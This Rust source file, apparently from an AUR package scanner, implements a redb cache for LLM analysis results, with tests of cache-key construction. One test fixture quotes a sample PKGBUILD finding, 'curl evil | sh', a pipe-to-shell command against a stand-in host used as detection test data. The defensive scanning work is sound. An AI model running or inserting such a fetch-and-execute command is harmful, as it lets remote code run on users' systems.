use crate::grounding::GroundedClaim;
use crate::types::{AnalysisIdentity, TokenUsage};
use redb::{Database, TableDefinition};
use serde::{Deserialize, Serialize};
use std::path::{Path, PathBuf};

const ANALYSES: TableDefinition<&[u8], &[u8]> = TableDefinition::new("analyses_v1");
const KEY_DOMAIN: &[u8] = b"aurscan-llm-analysis-v1\0";

#[derive(Debug, Clone)]
pub(crate) struct CompletedClaims {
    pub(crate) identity: AnalysisIdentity,
    pub(crate) claims: Vec<GroundedClaim>,
    pub(crate) usage: Option<TokenUsage>,
    pub(crate) analysed_at: u64,
}

pub(crate) trait AnalysisCache: Send + Sync {
    fn get(&self, identity: &AnalysisIdentity) -> Option<CompletedClaims>;
    fn put(&self, identity: &AnalysisIdentity, completed: &CompletedClaims);
}

pub(crate) struct RedbAnalysisCache {
    database: Database,
}

impl RedbAnalysisCache {
    pub(crate) fn open(path: &Path) -> anyhow::Result<Self> {
        if let Some(parent) = path.parent() {
            std::fs::create_dir_all(parent)?;
        }
        Ok(Self {
            database: Database::create(path)?,
        })
    }

    pub(crate) fn default_path() -> PathBuf {
        dirs::cache_dir()
            .unwrap_or_else(|| PathBuf::from("/tmp"))
            .join("aurscan/llm.redb")
    }

    fn key_bytes(identity: &AnalysisIdentity) -> Vec<u8> {
        fn append_string(bytes: &mut Vec<u8>, value: &str) {
            bytes.extend_from_slice(&(value.len() as u64).to_le_bytes());
            bytes.extend_from_slice(value.as_bytes());
        }

        let mut bytes = Vec::with_capacity(
            KEY_DOMAIN.len()
                + 32
                + 2
                + 32
                + 8
                + identity.model_id.len()
                + 8
                + identity.review_strategy_id.len()
                + 32
                + 4
                + 32
                + 2
                + 32
                + 4,
        );
        bytes.extend_from_slice(KEY_DOMAIN);
        bytes.extend_from_slice(&identity.bundle_hash);
        bytes.extend_from_slice(&identity.provider_protocol_version.to_le_bytes());
        bytes.extend_from_slice(&identity.endpoint_origin_fingerprint);
        append_string(&mut bytes, &identity.model_id);
        append_string(&mut bytes, &identity.review_strategy_id);
        bytes.extend_from_slice(&identity.request_profile_fingerprint);
        bytes.extend_from_slice(&identity.prompt_version.to_le_bytes());
        bytes.extend_from_slice(&identity.prompt_hash);
        bytes.extend_from_slice(&identity.response_schema_version.to_le_bytes());
        bytes.extend_from_slice(&identity.response_schema_hash);
        bytes.extend_from_slice(&identity.analysis_epoch.to_le_bytes());
        bytes
    }
}

impl AnalysisCache for RedbAnalysisCache {
    fn get(&self, identity: &AnalysisIdentity) -> Option<CompletedClaims> {
        let transaction = self.database.begin_read().ok()?;
        let table = transaction.open_table(ANALYSES).ok()?;
        let raw = table.get(Self::key_bytes(identity).as_slice()).ok()??;
        let stored: StoredCompletedClaims = serde_json::from_slice(raw.value()).ok()?;
        let completed = stored.into_completed();
        (completed.identity == *identity).then_some(completed)
    }

    fn put(&self, identity: &AnalysisIdentity, completed: &CompletedClaims) {
        if completed.identity != *identity {
            return;
        }
        let Ok(bytes) = serde_json::to_vec(&StoredCompletedClaims::from_completed(completed))
        else {
            return;
        };
        let Ok(transaction) = self.database.begin_write() else {
            return;
        };
        {
            let Ok(mut table) = transaction.open_table(ANALYSES) else {
                return;
            };
            if table
                .insert(Self::key_bytes(identity).as_slice(), bytes.as_slice())
                .is_err()
            {
                return;
            }
        }
        let _ = transaction.commit();
    }
}

#[derive(Serialize, Deserialize)]
struct StoredCompletedClaims {
    identity: StoredIdentity,
    claims: Vec<GroundedClaim>,
    usage: Option<StoredUsage>,
    analysed_at: u64,
}

impl StoredCompletedClaims {
    fn from_completed(completed: &CompletedClaims) -> Self {
        Self {
            identity: StoredIdentity::from_identity(&completed.identity),
            claims: completed.claims.clone(),
            usage: completed.usage.map(StoredUsage::from_usage),
            analysed_at: completed.analysed_at,
        }
    }

    fn into_completed(self) -> CompletedClaims {
        CompletedClaims {
            identity: self.identity.into_identity(),
            claims: self.claims,
            usage: self.usage.map(StoredUsage::into_usage),
            analysed_at: self.analysed_at,
        }
    }
}

#[derive(Serialize, Deserialize)]
struct StoredIdentity {
    bundle_hash: [u8; 32],
    provider_protocol_version: u16,
    endpoint_origin_fingerprint: [u8; 32],
    model_id: String,
    review_strategy_id: String,
    request_profile_fingerprint: [u8; 32],
    prompt_version: u32,
    prompt_hash: [u8; 32],
    response_schema_version: u16,
    response_schema_hash: [u8; 32],
    analysis_epoch: u32,
}

impl StoredIdentity {
    fn from_identity(identity: &AnalysisIdentity) -> Self {
        Self {
            bundle_hash: identity.bundle_hash,
            provider_protocol_version: identity.provider_protocol_version,
            endpoint_origin_fingerprint: identity.endpoint_origin_fingerprint,
            model_id: identity.model_id.clone(),
            review_strategy_id: identity.review_strategy_id.clone(),
            request_profile_fingerprint: identity.request_profile_fingerprint,
            prompt_version: identity.prompt_version,
            prompt_hash: identity.prompt_hash,
            response_schema_version: identity.response_schema_version,
            response_schema_hash: identity.response_schema_hash,
            analysis_epoch: identity.analysis_epoch,
        }
    }

    fn into_identity(self) -> AnalysisIdentity {
        AnalysisIdentity {
            bundle_hash: self.bundle_hash,
            provider_protocol_version: self.provider_protocol_version,
            endpoint_origin_fingerprint: self.endpoint_origin_fingerprint,
            model_id: self.model_id,
            review_strategy_id: self.review_strategy_id,
            request_profile_fingerprint: self.request_profile_fingerprint,
            prompt_version: self.prompt_version,
            prompt_hash: self.prompt_hash,
            response_schema_version: self.response_schema_version,
            response_schema_hash: self.response_schema_hash,
            analysis_epoch: self.analysis_epoch,
        }
    }
}

#[derive(Serialize, Deserialize)]
struct StoredUsage {
    input_tokens: u64,
    output_tokens: u64,
}

impl StoredUsage {
    fn from_usage(usage: TokenUsage) -> Self {
        Self {
            input_tokens: usage.input_tokens,
            output_tokens: usage.output_tokens,
        }
    }

    fn into_usage(self) -> TokenUsage {
        TokenUsage {
            input_tokens: self.input_tokens,
            output_tokens: self.output_tokens,
        }
    }
}

#[cfg(test)]
mod tests {
    use super::{AnalysisCache, CompletedClaims, RedbAnalysisCache};
    use crate::grounding::{CandidateSeverity, GroundedClaim};
    use crate::types::{AnalysisIdentity, LlmFindingKind, TokenUsage};

    fn identity() -> AnalysisIdentity {
        AnalysisIdentity {
            bundle_hash: [1; 32],
            provider_protocol_version: 1,
            endpoint_origin_fingerprint: [2; 32],
            model_id: "model".into(),
            review_strategy_id: "strategy".into(),
            request_profile_fingerprint: [3; 32],
            prompt_version: 4,
            prompt_hash: [5; 32],
            response_schema_version: 6,
            response_schema_hash: [7; 32],
            analysis_epoch: 8,
        }
    }

    fn completed(identity: AnalysisIdentity) -> CompletedClaims {
        CompletedClaims {
            identity,
            claims: vec![GroundedClaim {
                kind: LlmFindingKind::DownloadExecute,
                severity: CandidateSeverity::High,
                relative_path: "PKGBUILD".into(),
                start_line: 2,
                end_line: 2,
                reason: "attacker path and impact".into(),
                excerpt: "curl evil | sh".into(),
            }],
            usage: Some(TokenUsage {
                input_tokens: 10,
                output_tokens: 2,
            }),
            analysed_at: 1234,
        }
    }

    #[test]
    fn every_identity_dimension_participates_in_the_cache_key() {
        let dir = tempfile::tempdir().unwrap();
        let cache = RedbAnalysisCache::open(&dir.path().join("cache.redb")).unwrap();
        let baseline = identity();
        cache.put(&baseline, &completed(baseline.clone()));
        assert!(cache.get(&baseline).is_some());

        let mut variants = Vec::new();
        let mut changed = baseline.clone();
        changed.bundle_hash[0] ^= 1;
        variants.push(changed);
        let mut changed = baseline.clone();
        changed.provider_protocol_version += 1;
        variants.push(changed);
        let mut changed = baseline.clone();
        changed.endpoint_origin_fingerprint[0] ^= 1;
        variants.push(changed);
        let mut changed = baseline.clone();
        changed.model_id.push('2');
        variants.push(changed);
        let mut changed = baseline.clone();
        changed.review_strategy_id.push('2');
        variants.push(changed);
        let mut changed = baseline.clone();
        changed.request_profile_fingerprint[0] ^= 1;
        variants.push(changed);
        let mut changed = baseline.clone();
        changed.prompt_version += 1;
        variants.push(changed);
        let mut changed = baseline.clone();
        changed.prompt_hash[0] ^= 1;
        variants.push(changed);
        let mut changed = baseline.clone();
        changed.response_schema_version += 1;
        variants.push(changed);
        let mut changed = baseline.clone();
        changed.response_schema_hash[0] ^= 1;
        variants.push(changed);
        let mut changed = baseline.clone();
        changed.analysis_epoch += 1;
        variants.push(changed);

        for variant in variants {
            assert!(
                cache.get(&variant).is_none(),
                "identity variant unexpectedly hit"
            );
        }
    }

    #[test]
    fn variable_length_identity_fields_are_unambiguously_framed() {
        let mut first = identity();
        first.model_id = "ab".into();
        first.review_strategy_id = "c".into();
        let mut second = identity();
        second.model_id = "a".into();
        second.review_strategy_id = "bc".into();
        assert_ne!(
            RedbAnalysisCache::key_bytes(&first),
            RedbAnalysisCache::key_bytes(&second)
        );
    }
}
